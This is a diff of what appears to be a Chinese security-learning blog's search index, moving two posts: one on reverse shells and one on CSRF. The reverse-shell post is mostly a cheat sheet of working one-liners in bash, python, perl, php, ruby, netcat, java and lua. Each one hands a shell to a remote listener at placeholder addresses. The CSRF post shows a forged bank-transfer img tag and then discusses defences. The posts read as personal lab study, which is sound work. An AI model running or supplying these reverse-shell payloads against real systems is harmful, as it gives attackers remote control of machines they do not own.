@@ -522,6 +522,59 @@
 ]]></content>
   </entry>
   <entry>
+    <title>反弹shell学习</title>
+    <url>/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
+<p>攻击者：kali2020.03 64位 192.168.229.129</p>
+<p>靶机：kali2018 192.168.229.130</p>
+<p>[</p>
+<p>](<a href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a>)</p>
+<h3 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h3><p>反弹shell的命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>开启监听端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
+<p>受害机上使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">解释：</span><br><span class="line">bash -i代表在本地打开一个bash</span><br><span class="line">然后就是&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port， &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</span><br><span class="line">&gt;&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</span><br><span class="line">加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305370591-81a7de94-5ef7-4df9-afb8-ca230297e390.png" alt="img"></p>
+<h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><p>反弹shell的命令变为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305501499-5f0540e6-7b0f-40f4-940a-4082513732f0.png" alt="img"></p>
+<h3 id="nc-反弹"><a href="#nc-反弹" class="headerlink" title="nc 反弹"></a>nc 反弹</h3><p>条件是靶机上有nc</p>
+<p>尝试两种方法后都莫有成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port </span><br><span class="line">-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(&#x2F;bin&#x2F;bash)，也就是反弹一个shell给远程</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307363295-39c15dae-1953-4fa5-9734-4a9cd7b14533.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307406531-927cfb8d-dfef-47f4-ae92-b22f6432bed7.png" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp port</span><br><span class="line">nc -nvlp port</span><br><span class="line">nc ip port|&#x2F;bin&#x2F;bash|ip port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用nc监听端口反弹shell时可能会有一个警告：</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host,</span><br><span class="line">根据nc帮助文档的提示加上-n参数就可以不产生这个警告了</span><br><span class="line">-n参数代表在建立连接之前不对主机进行dns解析</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307323674-b71ca629-7869-4534-ab4e-3feb9986cfd7.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307242554-99df599d-d6cf-4913-8fde-69cd68b76c2d.png" alt="img"></p>
+<h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
+<p>默认的php.ini文件中没有打开安全模式</p>
+<p>使用php的exec函数执行反弹shell的命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -&#39;exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<p>但是没有成功</p>
+<p> 之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623311000363-c37aba29-3a5d-4a03-b086-93ac4b0df42b.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623310925650-41688ec7-49d7-4aea-9b28-012b0c4afcb2.png" alt="img"></p>
+<h3 id="附上国外大佬整理的各种版本的shell写法"><a href="#附上国外大佬整理的各种版本的shell写法" class="headerlink" title="附上国外大佬整理的各种版本的shell写法"></a>附上国外大佬整理的各种版本的shell写法</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;nc版本正确，存在-e选项就能直接反弹shell</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不存在-e选项</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888|&#x2F;bin&#x2F;sh|nc x.x.x.x 9999</span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
+<p>攻击者：kali2020.03 64位 192.168.229.129</p>
+<p>靶机：win7 x64 192.168.229.134</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
+<p>emmm暂时先鸽了</p>
+<h2 id="其他反弹shell的方式"><a href="#其他反弹shell的方式" class="headerlink" title="其他反弹shell的方式"></a>其他反弹shell的方式</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247483867&idx=1&sn=ac1c105241c071190fae3d18938e9189&chksm=c172dbc7f60552d1e0e0dd5a23d71e00e6472ba344088c6811a7c426a2cf08cfc2af0ba06a80&scene=178&cur_album_id=1555994601520431105#rd">利用ICMP(icmpsh)协议反弹Shell</a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
+<p><a href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>内网环境搭建</title>
     <url>/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<h1 id="基本内网环境搭建"><a href="#基本内网环境搭建" class="headerlink" title="基本内网环境搭建"></a>基本内网环境搭建</h1><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>用的思科模拟器画的，连接的方法肯定有问题，也没有连通，只能大概了解（学会了一定改）</p>
@@ -586,59 +639,6 @@
       <tags>
         <tag>内网</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>反弹shell学习</title>
-    <url>/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
-<p>攻击者：kali2020.03 64位 192.168.229.129</p>
-<p>靶机：kali2018 192.168.229.130</p>
-<p>[</p>
-<p>](<a href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a>)</p>
-<h3 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h3><p>反弹shell的命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>开启监听端口</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
-<p>受害机上使用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">解释：</span><br><span class="line">bash -i代表在本地打开一个bash</span><br><span class="line">然后就是&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port， &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</span><br><span class="line">&gt;&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</span><br><span class="line">加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305370591-81a7de94-5ef7-4df9-afb8-ca230297e390.png" alt="img"></p>
-<h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><p>反弹shell的命令变为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305501499-5f0540e6-7b0f-40f4-940a-4082513732f0.png" alt="img"></p>
-<h3 id="nc-反弹"><a href="#nc-反弹" class="headerlink" title="nc 反弹"></a>nc 反弹</h3><p>条件是靶机上有nc</p>
-<p>尝试两种方法后都莫有成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port </span><br><span class="line">-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(&#x2F;bin&#x2F;bash)，也就是反弹一个shell给远程</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307363295-39c15dae-1953-4fa5-9734-4a9cd7b14533.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307406531-927cfb8d-dfef-47f4-ae92-b22f6432bed7.png" alt="img"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp port</span><br><span class="line">nc -nvlp port</span><br><span class="line">nc ip port|&#x2F;bin&#x2F;bash|ip port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用nc监听端口反弹shell时可能会有一个警告：</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host,</span><br><span class="line">根据nc帮助文档的提示加上-n参数就可以不产生这个警告了</span><br><span class="line">-n参数代表在建立连接之前不对主机进行dns解析</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307323674-b71ca629-7869-4534-ab4e-3feb9986cfd7.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307242554-99df599d-d6cf-4913-8fde-69cd68b76c2d.png" alt="img"></p>
-<h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
-<p>默认的php.ini文件中没有打开安全模式</p>
-<p>使用php的exec函数执行反弹shell的命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -&#39;exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port&quot;)&#39;</span><br></pre></td></tr></table></figure>
-<p>但是没有成功</p>
-<p> 之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623311000363-c37aba29-3a5d-4a03-b086-93ac4b0df42b.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623310925650-41688ec7-49d7-4aea-9b28-012b0c4afcb2.png" alt="img"></p>
-<h3 id="附上国外大佬整理的各种版本的shell写法"><a href="#附上国外大佬整理的各种版本的shell写法" class="headerlink" title="附上国外大佬整理的各种版本的shell写法"></a>附上国外大佬整理的各种版本的shell写法</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;nc版本正确，存在-e选项就能直接反弹shell</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不存在-e选项</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888|&#x2F;bin&#x2F;sh|nc x.x.x.x 9999</span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
-<p>攻击者：kali2020.03 64位 192.168.229.129</p>
-<p>靶机：win7 x64 192.168.229.134</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
-<p>emmm暂时先鸽了</p>
-<h2 id="其他反弹shell的方式"><a href="#其他反弹shell的方式" class="headerlink" title="其他反弹shell的方式"></a>其他反弹shell的方式</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247483867&idx=1&sn=ac1c105241c071190fae3d18938e9189&chksm=c172dbc7f60552d1e0e0dd5a23d71e00e6472ba344088c6811a7c426a2cf08cfc2af0ba06a80&scene=178&cur_album_id=1555994601520431105#rd">利用ICMP(icmpsh)协议反弹Shell</a></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
-<p><a href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
-]]></content>
   </entry>
   <entry>
     <title>常见web漏洞学习之xss学习</title>
@@ -710,6 +710,51 @@
       </categories>
       <tags>
         <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>常见web漏洞学习之CSRF</title>
+    <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
+    <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或访问包含攻击代码的页面（钓鱼），在受害者不知情的情况下以受害者的身份向发送请求，从而完成非法操作。</p>
+<p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p>
+<blockquote>
+<p>与XSS最大区别就是csrf并没有盗取cookie而是直接利用</p>
+</blockquote>
+<p>图里解释很清楚了，就不赘述了</p>
+<p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
+<p>还是老生常谈的银行转账的问题</p>
+<p>已知受害者在银行以GET请求来完成银行转账的操作，<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
+<p>而攻击者构造的代码是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当受害者登录银行，然后被钓鱼或是诱导点击了攻击者的链接，这样<img>以GET的方式进行了转账操作</p>
+<p>后面改进的示例就不列举了，大概总结就是<code>$_REQUEST</code>既可以获取get请求的数据，也可以获取post请求的数据，当后台使用<code>$_REQUEST</code>获取数据时还是存在无法区分</p>
+<blockquote>
+<p>在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题</p>
+</blockquote>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最好是有目标站点的CMS，在本地搭建并构造一下例如创建管理员，开放权限等数据包，通过钓鱼等手段诱导管理员点击，执行数据包；要是没有目标站点的cms，也可以尝试抓包构造一下，不过有一定难度</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是<strong>来自于某个用户的浏览器</strong>，但却<strong>无法保证该请求是用户批准发送的</strong></p>
+<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><ol>
+<li>验证http referer字段</li>
+</ol>
+<p>referer就是记录了请求的来源（同源策略）</p>
+<blockquote>
+<p>然而，这种方法并非万无一失。Referer  的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer  的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全</p>
+</blockquote>
+<p>因为服务器并不是什么时候都能取到Referer，也可以通过抓包修改进行绕过，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法</p>
+<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><ol start="2">
+<li>添加token并验证</li>
+</ol>
+<p>一致的做法是使用一个token（<strong>Anti CSRF Token</strong>）</p>
+<p>用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a></p>
+<p><a href="https://www.cnblogs.com/lsj-info/p/9479755.html">CSRF攻击原理以及防御方法</a></p>
+]]></content>
+      <categories>
+        <category>csrf</category>
+      </categories>
+      <tags>
+        <tag>csrf</tag>
       </tags>
   </entry>
   <entry>
@@ -835,142 +880,6 @@
       <tags>
         <tag>rce</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>常见web漏洞学习之CSRF</title>
-    <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
-    <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或访问包含攻击代码的页面（钓鱼），在受害者不知情的情况下以受害者的身份向发送请求，从而完成非法操作。</p>
-<p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p>
-<blockquote>
-<p>与XSS最大区别就是csrf并没有盗取cookie而是直接利用</p>
-</blockquote>
-<p>图里解释很清楚了，就不赘述了</p>
-<p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
-<p>还是老生常谈的银行转账的问题</p>
-<p>已知受害者在银行以GET请求来完成银行转账的操作，<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
-<p>而攻击者构造的代码是</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当受害者登录银行，然后被钓鱼或是诱导点击了攻击者的链接，这样<img>以GET的方式进行了转账操作</p>
-<p>后面改进的示例就不列举了，大概总结就是<code>$_REQUEST</code>既可以获取get请求的数据，也可以获取post请求的数据，当后台使用<code>$_REQUEST</code>获取数据时还是存在无法区分</p>
-<blockquote>
